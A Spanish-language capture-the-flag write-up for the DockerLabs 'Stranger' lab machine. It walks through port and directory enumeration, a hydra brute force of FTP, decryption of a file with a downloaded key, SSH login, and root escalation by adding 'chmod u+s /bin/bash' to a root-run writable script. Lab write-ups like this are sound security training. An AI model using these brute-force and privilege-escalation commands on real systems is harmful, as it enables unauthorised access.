# Máquina Stranger
Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/VDtF0D4Q#NqCgaMcTlVPPm2FpUO3-0E50yxCzqpL2imaXpNIifpU)

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/6c5983bd-049a-4a6e-ad43-9dfa3fb1bfa3)


- **Nombre de la Máquina:** Stranger
- **Sistema Operativo**: Linux
- **Dificultad:** Medium
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
	- Desencriptar archivo con openSSL.
  - Editar script backup.sh ue lo ejecuta **root** cada X tiempo.

## Reconocimiento y enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina víctima para ver que puertos tiene abiertos.
```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/3b9e9779-436a-4c0e-bd98-5fe89714ce44)

Nos reporta los puertos 21, 22 y 80 , haremos un escaneo mas exhaustivo para ver que corre por cada puerto.
```bash
sudo nmap -p -p 21,22,80 -sCV 172.17.0.2 -oN targeted.txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/aeaa0e46-7aee-4b90-b7e8-121a713d61e6)
Como podemos extraer del reporte de nmap disponemos de servicio ftp, ssh y apache.

En el puerto 80 vemos la página por defecto de apache.
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/0a7eedef-66ff-4211-8d6d-16063f1e4fca)

Realizo una búsqueda de directorios para ver cosas interesantes, encuentro un index.html y un directorio /strange. En index.html encontramos un posible nombre de usuario: **mwheeler**.
```bash
sudo gobuster dir -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/230abae8-54aa-4668-bb54-76292ada4d4d)
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/f1f0cc27-d4a0-4e09-856b-dcc9d4ef2105)

Sigo investigando el directorio /strange y no veo nada interesante.
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/f365c091-aaf4-43eb-84a8-1905b59e7afc)

Procedo a buscar archivos o más directorios dentro de /strange y encontramos dos directorios interesantes, secret.html y private.txt.
```bash
sudo gobuster dir -u 'http://172.17.0.2/strange' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e24e320f-723c-475a-b7db-25c031e12230)

En secret.html me encuentro un texto que dice que el usuario admin corresponde al ftp pero que la contraseña la encontremos haciendo fuerza bruta, lo que quiere decir es que usemos hydra para encontrar la contraseña del usuario admin en ftp.

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/90388f49-1486-4d3c-a7ba-0620464c41f8)

El archivo de texto private.txt no podemos hacer nada con él ya que está encriptado y no nos sirve por ahora.

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/789e2150-541e-4fa8-bf18-99105eb5251e)

De lo que me doy cuenta es de que no es un archivo txt normal ya que cuando lanzo el comando file, no me reporta ascii, me indica que son datos, así que diría que es algo encriptado:
```bash
file private.txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/250b9e27-b8b6-4802-b1bf-c902671b6c67)

### Fuerza bruta con Hydra
Para realizar el ataque de fuerza bruta usaremos el siguiente comando, utilizando el diccionario rockyou:
```bash
hydra -l "admin" -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ftp -t 64
```
Nos encontró la contraseña:
- Name: admin
- Password: banana
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/88b89ed1-7b76-44bf-b4f3-44408c61ea94)

### FTP
Iniciamos ftp con el usuario y la contraseña que hemos descubierto, vemos un archivo llamado private_key.pem, nos lo descargaremos e investigaremos.
```bash
ftp 172.17.0.2
admin
banana
get private_key.pem
exit
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/92ef8c51-a378-42b8-a058-1a48b320982c)

### Desencriptar con OpenSSL
Tenemos un archivo .pem y un texto cifrado dentro de private.txt, investigando un poco por google, veo que para descifrarlo tendremos que usar un comando de openssl.
```
PEM son las siglas de correo de privacidad mejorada. El formato PEM se utiliza a menudo para representar certificados, solicitudes de certificados, cadenas de certificados y claves. La extensión típica de un archivo con formato PEM es .pem, pero no es obligatoria.
```

```bash
openssl pkeyutl -decrypt -inkey private_key.pem -in private.txt -out privateOUT.txt
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/09a364f7-6257-4530-bb12-c1518af96e44)

Pues la clave que nos daría sería **demogorgon**

## Intrusión vía SSH
Como ya tenemos el usuario del principio (**mwheeler**) y la posible contraseña (**demogorgon**) lo usaremos para entrar vía ssh a la máquina víctima.
```bash
ssh mwheeler@172.17.0.2
demogorgon
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/dd6e0a2d-a1ec-46a6-80cd-b0cc5974946c)

## Escalada de privilegios
Una vez dentro, intento buscar la manera de escalar los privilegios a root con sudo -l pero no tenemos permisos sudo, también intento buscar binarios con permisos SUID pero tampoco encuentro alguno válido.
Enumerando el sistema me doy cuenta de que **root** está ejecutando cada X tiempo un script en bash.
```bash
ps -aux
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/b35e7f0f-f8af-4c28-8c85-b92a3ff31530)

Vemos que nosotros tenemos permisos de escritura en ese script en concreto.
```bash
ls -l /usr/local/bin/
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/7d371e06-3e58-4330-a2b4-f7afdfbdbb9f)

Pues simplemente agregaremos el comando `chmod u+s /bin/bash` para que cuando el script lo ejecute root, nos proporcione permisos SUID a la bash.
```bash
vim /usr/local/bin/backup.sh
chmod u+s /bin/bash
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/c6ce1e63-4bbd-4ca0-8d51-cc45f3f98d46)
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/3ea6cedc-6ffc-4ad1-a707-e2a53edb7814)

Ahora simplemente con el comando `bash -p` elevaremos nuestros privilegios a root.
```bash
bash -p
```
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/5a872791-28da-43a5-abfa-93aff8e11e01)

Fin de la máquina y con flag incluida.
